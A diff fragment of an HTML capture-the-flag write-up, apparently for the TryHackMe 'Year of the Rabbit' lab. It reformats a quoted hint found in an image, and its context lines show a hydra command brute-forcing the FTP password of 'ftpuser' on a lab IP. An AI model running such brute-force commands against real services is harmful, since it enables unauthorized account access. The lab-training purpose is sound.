@@ -44,7 +44,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ strings bae.png
-</pre></table></code></div></div><p>We found a message as shown below.</p><blockquote><p>[!note] message from image Eh, you’ve earned this. Username for FTP is ftpuser One of these is the password:</p></blockquote><h2 id="brute-force-ftp-password">Brute-force ftp password.</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>We found a message as shown below.</p><blockquote><p>message from image</p><p>Eh, you’ve earned this. Username for FTP is ftpuser One of these is the password:</p></blockquote><h2 id="brute-force-ftp-password">Brute-force ftp password.</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/thm/yearOfrabbit]
 └─$ hydra -l ftpuser -P "ftp-passwds" -s 21 -o "ftp-results" ftp://10.10.59.107 
